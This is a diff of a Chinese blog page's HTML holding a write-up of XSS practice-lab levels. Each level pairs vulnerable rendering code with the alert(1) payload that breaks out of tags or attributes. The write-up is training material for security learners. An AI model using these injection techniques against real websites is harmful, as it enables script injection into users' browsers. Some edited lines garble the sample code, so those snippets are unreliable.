@@ -460,12 +460,12 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h3 id="https：-xss-haozi-me"><a href="#https：-xss-haozi-me" class="headerlink" title="https：//xss.haozi.me"></a>https：//xss.haozi.me</h3><h5 id="0x00"><a href="#0x00" class="headerlink" title="#0x00"></a>#0x00</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-  <span class="token keyword">return</span> <span class="token string">'&lt;div>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/div>'</span>
+  <span class="token keyword">return</span> <span class="token markup">&lt;div + input + /div></span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：无任何过滤。</p>
 <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
-  return <textarea> + input + </textarea>
+  return <textarea + input + /textarea>
 &#125;</code></pre>
 <p>代码分析：内容生效在标签内，会无效。拼接绕过</p>
 <pre class=" language-PHP"><code class="language-PHP"></textarea><script>alert(1)</script></code></pre>
@@ -655,16 +655,16 @@ alert(1)
 <p>代码分析：过滤”，感觉还不如上关。</p>
 <pre><code>&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <p>总结下吧：这个靶场很适合像作者这种刚入门XSS的菜鸟去刷刷。</p>
-<h3 id="XSS-LABS"><a href="#XSS-LABS" class="headerlink" title="XSS-LABS"></a>XSS-LABS</h3><h5 id="0x01-1"><a href="#0x01-1" class="headerlink" title="#0x01"></a>#0x01</h5><p>#直接上代码</p>
+<h3 id="XSS-LABS"><a href="#XSS-LABS" class="headerlink" title="XSS-LABS"></a>XSS-LABS</h3><h5 id="0x01-1"><a href="#0x01-1" class="headerlink" title="#0x01"></a>#0x01</h5><p>#代码利用</p>
 <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <h5 id="0x02-1"><a href="#0x02-1" class="headerlink" title="#0x02"></a>#0x02</h5><p>代码回显的位置在标签内</p>
 <pre class=" language-php"><code class="language-php"><span class="token markup">&lt;input name=keyword  value="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>"<span class="token operator">></span></code></pre>
-<p>#利用代码</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
+<p>#代码利用</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <h5 id="0x03-1"><a href="#0x03-1" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span></code></pre>
 <p>利用函数对输入的内容进行了过滤。查看网页源代码</p>
 <pre><code>&lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt;    </code></pre>
-<p>#利用代码</p>
+<p>#代码利用</p>
 <pre><code>&#39; onclick=&#39;alert(1)</code></pre>
 <h5 id="0x04-1"><a href="#0x04-1" class="headerlink" title="#0x04"></a>#0x04</h5><p>和第3一样但注意到两关闭合使用的引号不同这关是”。</p>
 <p>#代码利用</p>
@@ -968,18 +968,17 @@ alert(1)
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/01/26/XSS%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/">
+                <a href="/2021/02/28/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85%E5%B0%8F%E6%B8%B8%E6%88%8F/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="XSS靶场合集">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="黑客丛林之旅小游戏">
                         
-                        <span class="card-title">XSS靶场合集</span>
+                        <span class="card-title">黑客丛林之旅小游戏</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -989,9 +988,9 @@ alert(1)
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-26
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-28
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1000,7 +999,6 @@ alert(1)
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
